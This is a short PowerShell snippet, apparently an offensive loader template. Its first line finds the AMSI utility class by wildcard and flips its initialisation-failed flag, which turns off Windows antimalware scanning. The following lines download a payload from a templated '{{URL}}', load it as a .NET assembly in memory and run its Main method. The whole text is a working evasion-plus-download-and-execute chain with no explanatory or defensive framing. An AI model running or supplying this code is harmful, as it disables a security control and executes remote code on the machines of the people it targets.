Foreach($type in [Ref].Assembly.GetTypes()){if($type.Name -like "*iuti*"){Foreach($field in $type.GetFields('NonPublic,Static')){if($field.Name -like "*iinit*"){$field.SetValue(0,$true)}}}}

$data=(New-Object System.Net.WebClient).DownloadData('{{URL}}');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
[Craft.Program]::Main();